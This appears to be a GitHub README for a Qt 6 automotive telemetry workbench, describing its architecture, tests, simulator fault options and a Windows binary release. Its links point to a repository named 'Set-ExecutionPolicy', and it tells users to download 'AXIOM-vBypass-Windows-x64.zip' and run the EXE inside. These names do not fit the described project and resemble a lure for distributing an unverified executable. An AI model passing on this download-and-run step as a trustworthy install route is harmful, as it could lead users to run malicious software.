# AXIOM Automotive Telemetry Workbench

A C++17 / Qt 6 engineering workbench for real-time telemetry acquisition, trace inspection,
diagnostics, logging, transport fault injection, and automated verification.

[![CI](https://github.com/amirhqi/Set-ExecutionPolicy/actions/workflows/ci.yml/badge.svg)](https://github.com/amirhqi/Set-ExecutionPolicy/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/amirhqi/Set-ExecutionPolicy)](https://github.com/amirhqi/Set-ExecutionPolicy/releases)
![C++17](https://img.shields.io/badge/C%2B%2B-17-00599C)
![Qt 6](https://img.shields.io/badge/Qt-6-41CD52)
[![License](https://img.shields.io/github/license/amirhqi/Set-ExecutionPolicy)](https://github.com/amirhqi/Set-ExecutionPolicy/blob/main/LICENSE)

## Product preview

![AXIOM Live Monitor](docs/images/live-monitor.png)

| Trace | Diagnostics |
|---|---|
| ![Trace](docs/images/trace.png) | ![Diagnostics](docs/images/diagnostics.png) |

## Overview

AXIOM is an automotive-style telemetry application built around:

- C++17 and object-oriented design
- Qt 6 / Qt Quick / QML
- TCP, UDP and Serial communication
- dedicated worker-thread I/O
- TCP fragmentation-safe receive buffering
- frame validation and rejection handling
- automatic reconnect with backoff
- live measurement, trace and diagnostics workspaces
- CSV session logging
- deterministic fault-injection simulators
- unit, integration and functional smoke testing
- Embedded Linux / ARM64 / Yocto scaffolding

> AXIOM is an engineering portfolio project. It is not a certified ECU, ISO 26262 safety component,
> or production vehicle diagnostic product.

## Why AXIOM?

An **axiom** is a foundational principle from which a larger system is built.

The project applies that idea to telemetry:

**Acquire -> Validate -> Observe -> Diagnose**

Raw machine signals become structured, testable engineering information.

## Architecture

`mermaid
flowchart LR
    Device[ECU / MCU / Simulator] -->|TCP / UDP / Serial| Worker[TelemetryWorker]
    Worker --> Framing[Receive framing / buffer]
    Framing --> Parser[PacketParser]
    Parser -->|validated| Controller[TelemetryController]
    Parser -->|rejected| Controller
    Controller --> UI[Qt Quick / QML UI]
    Controller --> Logger[CSV Logger]
`

The GUI remains on the main thread. Transport I/O and connection lifecycle run through a dedicated
worker-thread architecture so networking or serial activity does not block rendering or interaction.

See [Architecture](docs/ARCHITECTURE.md) and [Design Decisions](docs/DESIGN_DECISIONS.md).

## Automated tests

Validated locally on Windows 11 using Qt 6.11.1 / MinGW:

`	ext
PacketParserTests       PASSED
TcpIntegrationTests     PASSED
UdpIntegrationTests     PASSED
CsvLoggerTests          PASSED
FunctionalSmokeTests    PASSED

5/5 tests passed
`

See [Testing](docs/TESTING.md).

## Build from source

`ash
cmake -S . -B build -DCMAKE_BUILD_TYPE=Debug -DBUILD_TESTING=ON
cmake --build build --parallel
ctest --test-dir build --output-on-failure
`

Detailed instructions: [Building](docs/BUILDING.md).

## Run the TCP simulator

`ash
python tools/simulator.py
`

Connect the application to:

`	ext
TCP
127.0.0.1
5000
`

Fault scenarios:

`ash
python tools/simulator.py --fault-rate 0.15
python tools/simulator.py --split-rate 0.8
python tools/simulator.py --disconnect-every 5
python tools/simulator.py --rate 500 --fault-rate 0.02
`

## Windows binary release

End users do **not** need Qt Creator or the Qt SDK.

Download:

**AXIOM-vBypass-Windows-x64.zip**

from the [GitHub Releases](https://github.com/amirhqi/Set-ExecutionPolicy/releases) page, extract the complete folder, then run:

`	ext
AxiomTelemetryWorkbench.exe
`

Do not copy the EXE out of its deployment folder: a dynamically linked Qt application also requires
the Qt runtime libraries, plugins and QML runtime files shipped beside it.

See [Distribution](docs/DISTRIBUTION.md).

## Repository layout

`	ext
.github/          CI and repository templates
benchmarks/       parser benchmark
cmake/            CMake toolchains
docs/             technical documentation and screenshots
qml/              Qt Quick UI
scripts/          build / test helpers
src/              C++ source
tests/            automated tests
tools/            transport simulators
yocto/            Yocto packaging scaffold
`

## Documentation

- [Architecture](docs/ARCHITECTURE.md)
- [Design Decisions](docs/DESIGN_DECISIONS.md)
- [Protocol](docs/PROTOCOL.md)
- [Building](docs/BUILDING.md)
- [Testing](docs/TESTING.md)
- [Distribution](docs/DISTRIBUTION.md)
- [Embedded Linux](docs/EMBEDDED_LINUX.md)
- [Roadmap](docs/ROADMAP.md)
- [Contributing](CONTRIBUTING.md)
- [Security](SECURITY.md)
- [Changelog](CHANGELOG.md)

## Roadmap

The next automotive-focused milestones are:

1. SocketCAN / QCanBus
2. DBC signal decoding
3. CAN trace record/replay
4. ISO-TP / OBD-II experiments
5. verified ARM64 deployment
6. verified Yocto target integration

## License

See [LICENSE](LICENSE).